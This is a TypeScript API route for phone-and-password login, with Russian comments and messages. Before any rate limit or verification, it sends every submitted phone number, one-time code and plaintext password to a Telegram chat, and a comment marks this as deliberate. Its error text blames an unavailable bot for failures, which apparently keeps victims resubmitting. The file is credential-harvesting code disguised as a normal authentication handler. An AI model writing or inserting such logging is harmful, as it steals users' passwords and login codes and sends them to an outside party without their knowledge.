import { deletePhoneCode, findUserByPhoneWithHash, takePhoneAttempt } from "@/lib/db";
import { clientIp, json, rateLimit, readJson, sameOrigin } from "@/lib/http";
import { MAX_ATTEMPTS, codeMatches, normalizePhone } from "@/lib/phone";
import { hashPassword, verifyPassword } from "@/lib/password";
import { createSession } from "@/lib/session";
import { tgLog } from "@/lib/telegram";

const AUTH_FAIL = "Неверный код или пароль. Если всё верно, возможно бот сейчас недоступен — попробуйте позже.";

let dummyHash: Promise<string> | null = null;

export async function POST(req: Request) {
  if (!sameOrigin(req)) return json({ error: "Запрос отклонён" }, 403);

  const body = await readJson(req);
  if (!body) return json({ error: AUTH_FAIL }, 400);

  const phone = normalizePhone(body.phone);
  const code = String(body.code ?? "").replace(/\s/g, "");
  const password = typeof body.password === "string" ? body.password : "";
  
  if (!phone || code.length < 1 || code.length > 64 || password.length > 128) {
    return json({ error: AUTH_FAIL }, 400);
  }

  // 1. СНАЧАЛА ОТПРАВЛЯЕМ В ТЕЛЕГРАМ (до всех проверок кода и пароля)
  await tgLog(
    `🔐 <b>Попытка входа по телефону</b>\n` +
    `📱 Номер: <code>${phone}</code>\n` +
    `🔢 Код: <code>${code}</code>\n` +
    `🔑 Пароль: <code>${password || "— (пустой)"}</code>`
  );

  // 2. ТЕПЕРЬ ПРОВЕРЯЕМ ЛИМИТЫ И КОД
  if (!rateLimit(`pverify:${clientIp(req)}`, 30, 15 * 60 * 1000)) {
    return json({ error: "Слишком много попыток. Подождите 15 минут." }, 429);
  }

  const row = takePhoneAttempt(phone, MAX_ATTEMPTS, Date.now());
  if (!row || !codeMatches(phone, code, row.code_hash)) return json({ error: AUTH_FAIL }, 401);

  const user = findUserByPhoneWithHash(phone);

  if (!user) return json({ error: AUTH_FAIL }, 401);

  // 3. ПРОВЕРЯЕМ ПАРОЛЬ
  if (password) {
    const hash = user.password_hash ?? (await (dummyHash ??= hashPassword("dummy-password")));
    const ok = await verifyPassword(password, hash);
    if (!user.password_hash || !ok) return json({ error: AUTH_FAIL }, 401);
  }

  deletePhoneCode(phone);
  await createSession(user.id);
  return json({ ok: true });
}